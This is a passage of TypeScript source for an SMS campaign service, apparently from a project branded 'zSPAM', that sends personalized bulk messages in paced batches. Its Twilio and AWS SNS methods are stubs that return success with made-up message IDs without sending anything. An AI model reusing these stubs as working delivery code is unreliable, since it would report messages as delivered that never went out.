      return session[0];
    } catch (error) {
      console.error('Failed to get session details:', error);
      return null;
    }
  }
}

// Export singleton instance
export const sessionAnalyticsService = new SessionAnalyticsService();

server/smsService.ts.content:
import { Campaign, Recipient } from '@shared/schema';

export interface SmsContent {
  message: string;
  from?: string;
}

export interface SmsSendResult {
  success: boolean;
  messageId?: string;
  error?: string;
  recipient: string;
}

export interface SmsProvider {
  name: string;
  apiKey: string;
  apiSecret?: string;
  fromNumber: string;
}

export class SmsService {
  private provider: SmsProvider | null = null;

  setProvider(provider: SmsProvider): void {
    this.provider = provider;
  }

  async sendSms(to: string, content: SmsContent): Promise<SmsSendResult> {
    if (!this.provider) {
      return {
        success: false,
        error: 'SMS provider not configured',
        recipient: to,
      };
    }

    try {
      // For now, we'll simulate SMS sending
      // In production, integrate with actual SMS providers like Twilio, AWS SNS, etc.

      if (this.provider.name === 'twilio') {
        return await this.sendViaTwilio(to, content);
      } else if (this.provider.name === 'aws-sns') {
        return await this.sendViaAwsSns(to, content);
      } else {
        return await this.simulateSms(to, content);
      }
    } catch (error) {
      console.error('Failed to send SMS:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        recipient: to,
      };
    }
  }

  private async sendViaTwilio(to: string, content: SmsContent): Promise<SmsSendResult> {
    // TODO: Implement actual Twilio integration
    // const twilio = require('twilio');
    // const client = twilio(this.provider!.apiKey, this.provider!.apiSecret);

    console.log(`[TWILIO SIMULATION] SMS to ${to}: ${content.message}`);

    return {
      success: true,
      messageId: `twilio_${Date.now()}`,
      recipient: to,
    };
  }

  private async sendViaAwsSns(to: string, content: SmsContent): Promise<SmsSendResult> {
    // TODO: Implement actual AWS SNS integration
    console.log(`[AWS SNS SIMULATION] SMS to ${to}: ${content.message}`);

    return {
      success: true,
      messageId: `sns_${Date.now()}`,
      recipient: to,
    };
  }

  private async simulateSms(to: string, content: SmsContent): Promise<SmsSendResult> {
    // Simulate SMS sending for demo purposes
    console.log(`[SMS SIMULATION] To: ${to}, From: ${content.from || this.provider!.fromNumber}, Message: ${content.message}`);

    // Simulate random success/failure
    const isSuccess = Math.random() > 0.1; // 90% success rate

    if (isSuccess) {
      return {
        success: true,
        messageId: `sim_${Date.now()}`,
        recipient: to,
      };
    } else {
      return {
        success: false,
        error: 'Simulated delivery failure',
        recipient: to,
      };
    }
  }

  async sendSmsCampaign(
    campaign: Campaign,
    recipients: Recipient[],
    messageTemplate: string,
    options: {
      batchSize?: number;
      delayBetweenBatches?: number; // milliseconds
      delayBetweenSms?: number; // milliseconds
    } = {}
  ): Promise<{
    sentCount: number;
    failedCount: number;
    results: SmsSendResult[];
  }> {
    const {
      batchSize = 20,
      delayBetweenBatches = 10000, // 10 seconds
      delayBetweenSms = 2000, // 2 seconds
    } = options;

    const results: SmsSendResult[] = [];
    let sentCount = 0;
    let failedCount = 0;

    for (let i = 0; i < recipients.length; i += batchSize) {
      const batch = recipients.slice(i, i + batchSize);

      for (const recipient of batch) {
        try {
          const personalizedMessage = this.personalizeMessage(messageTemplate, recipient, campaign);
          const result = await this.sendSms(recipient.phone || recipient.email, {
            message: personalizedMessage,
            from: this.provider?.fromNumber,
          });

          results.push(result);

          if (result.success) {
            sentCount++;
          } else {
            failedCount++;
          }

          // Delay between SMS messages
          if (delayBetweenSms > 0) {
            await this.delay(delayBetweenSms);
          }

        } catch (error) {
          failedCount++;
          results.push({
            success: false,
            error: error instanceof Error ? error.message : 'Unknown error',
            recipient: recipient.phone || recipient.email,
          });
        }
      }

      // Delay between batches
      if (i + batchSize < recipients.length && delayBetweenBatches > 0) {
        await this.delay(delayBetweenBatches);
      }
    }

    return { sentCount, failedCount, results };
  }

  private personalizeMessage(template: string, recipient: Recipient, campaign: Campaign): string {
    let message = template;

    // Basic personalization
    const personalizations = {
      '{{name}}': recipient.name || recipient.firstName || 'User',
      '{{first_name}}': recipient.firstName || 'User',
      '{{last_name}}': recipient.lastName || '',
      '{{email}}': recipient.email,
      '{{company}}': recipient.company || '',
      '{{phone}}': recipient.phone || '',
    };

    for (const [placeholder, value] of Object.entries(personalizations)) {
      const regex = new RegExp(placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g');
      message = message.replace(regex, value);
    }

    return message;
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Test SMS functionality
  async sendTestSms(provider: SmsProvider, testNumber: string): Promise<SmsSendResult> {
    this.setProvider(provider);

    const testMessage = `zSPAM SMS Test - ${new Date().toISOString()}`;

    return await this.sendSms(testNumber, {
      message: testMessage,
      from: provider.fromNumber,
    });
  }

  // Validate phone number format
  validatePhoneNumber(phone: string): boolean {
    // Basic international phone number validation
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    return phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''));
  }

  // Format phone number for SMS sending
  formatPhoneNumber(phone: string): string {
    // Remove all non-digit characters except +
    let formatted = phone.replace(/[^\d+]/g, '');

    // Add + if not present and starts with country code
    if (!formatted.startsWith('+') && formatted.length > 10) {
      formatted = '+' + formatted;
    }

    return formatted;
  }
}

export const smsService = new SmsService();

